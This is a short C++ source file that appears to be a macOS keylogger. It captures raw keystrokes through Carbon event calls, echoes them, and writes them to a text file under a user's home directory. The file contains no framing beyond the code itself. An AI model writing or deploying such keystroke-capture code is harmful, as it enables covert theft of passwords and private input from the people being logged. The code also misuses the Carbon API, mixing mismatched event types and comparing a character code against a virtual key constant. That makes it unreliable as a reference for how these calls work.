#include <iostream>
#include <fstream>
#include <string>
#include <Carbon/Carbon.h>

void logKeys(std::string& keys) {
    EventRef event;
    char key;
    std::string keyStr;

    while (true) {
        if (WaitNextEvent(kEventQueueKeyboard, &event, 0, NULL) == noErr) {
            UInt32 eventKind = GetEventKind(event);

            if (eventKind == kEventRawKeyDown || eventKind == kEventRawKeyRepeat) {
                GetEventParameter(event, kEventParamKeyMacCharCodes, typeChar, NULL, sizeof(key), NULL, &key);
                keyStr = key;

                if (keyStr == "\r") {
                    keyStr = "<br>";
                }

                std::cout << keyStr;
                keys += keyStr;

                if (key == kVK_Escape) {
                    break;
                }
            }
        }
    }
}

int main() {
    std::string keys;

    logKeys(keys);

    std::ofstream myfile;
    myfile.open("/Users/username/log.txt");
    myfile << keys;
    myfile.close();

    return 0;
}